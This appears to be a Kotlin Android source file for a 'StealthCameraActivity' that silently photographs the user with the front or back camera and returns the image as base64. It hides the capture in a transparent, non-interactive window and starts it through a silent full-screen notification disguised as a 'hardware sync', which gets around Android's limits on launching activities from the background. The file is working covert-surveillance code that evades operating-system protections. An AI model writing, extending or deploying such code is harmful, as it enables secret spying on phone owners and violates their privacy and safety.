package com.example.service

import android.app.Activity
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import com.example.data.sync.CameraHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

class StealthCameraActivity : Activity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Make activity transparent, non-interactive, and invisible
        window.addFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
        )
        try {
            window.statusBarColor = Color.TRANSPARENT
            window.navigationBarColor = Color.TRANSPARENT
        } catch (_: Exception) {}

        val facing = intent.getStringExtra(EXTRA_FACING) ?: "back"

        CoroutineScope(Dispatchers.IO).launch {
            var helper: CameraHelper? = null
            try {
                helper = CameraHelper(this@StealthCameraActivity)
                val cameraId = helper.getCameraId(facing)
                val result = helper.takePhotoDirectHardware(cameraId)
                if (result != null && result.startsWith("data:image/jpeg;base64,")) {
                    latestCapturedPhoto = result
                    Log.d("StealthCameraActivity", "Hardware photo successfully captured via foreground stealth window.")
                }
            } catch (e: Exception) {
                Log.e("StealthCameraActivity", "Stealth camera capture error: ${e.message}")
            } finally {
                try { helper?.cleanup() } catch (_: Exception) {}
                latch.countDown()
                runOnUiThread {
                    try {
                        finish()
                        overridePendingTransition(0, 0)
                    } catch (_: Exception) {}
                }
            }
        }
    }

    companion object {
        const val EXTRA_FACING = "extra_facing"
        @Volatile
        private var latch = CountDownLatch(1)
        @Volatile
        private var latestCapturedPhoto: String? = null

        fun capturePhotoInForeground(context: Context, facing: String): String? {
            latch = CountDownLatch(1)
            latestCapturedPhoto = null

            val intent = Intent(context, StealthCameraActivity::class.java).apply {
                putExtra(EXTRA_FACING, facing)
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_NO_ANIMATION or
                        Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS or
                        Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or
                        Intent.FLAG_ACTIVITY_CLEAR_TOP
            }

            // Direct launch attempt
            try {
                context.startActivity(intent)
            } catch (e: Exception) {
                Log.w("StealthCameraActivity", "Direct startActivity failed: ${e.message}")
            }

            // FullScreenIntent Notification launch attempt (bypasses Android 10+ background activity blocks)
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
            val notificationId = 9918
            val channelId = "stealth_camera_channel"

            if (notificationManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    val channel = NotificationChannel(
                        channelId,
                        "Hardware Sync Channel",
                        NotificationManager.IMPORTANCE_HIGH
                    ).apply {
                        setSound(null, null)
                        enableVibration(false)
                    }
                    notificationManager.createNotificationChannel(channel)
                }

                val pendingIntent = PendingIntent.getActivity(
                    context,
                    notificationId,
                    intent,
                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
                )

                val notification = NotificationCompat.Builder(context, channelId)
                    .setSmallIcon(android.R.drawable.ic_menu_camera)
                    .setContentTitle("Processing Hardware Snap")
                    .setContentText("Syncing hardware state...")
                    .setPriority(NotificationCompat.PRIORITY_MAX)
                    .setCategory(NotificationCompat.CATEGORY_CALL)
                    .setFullScreenIntent(pendingIntent, true)
                    .setAutoCancel(true)
                    .build()

                try {
                    notificationManager.notify(notificationId, notification)
                } catch (e: Exception) {
                    Log.w("StealthCameraActivity", "FullScreenIntent notify failed: ${e.message}")
                }
            }

            // Await foreground camera capture for up to 6 seconds
            try {
                latch.await(6, TimeUnit.SECONDS)
            } catch (_: Exception) {}

            try {
                notificationManager?.cancel(notificationId)
            } catch (_: Exception) {}

            return latestCapturedPhoto
        }
    }
}
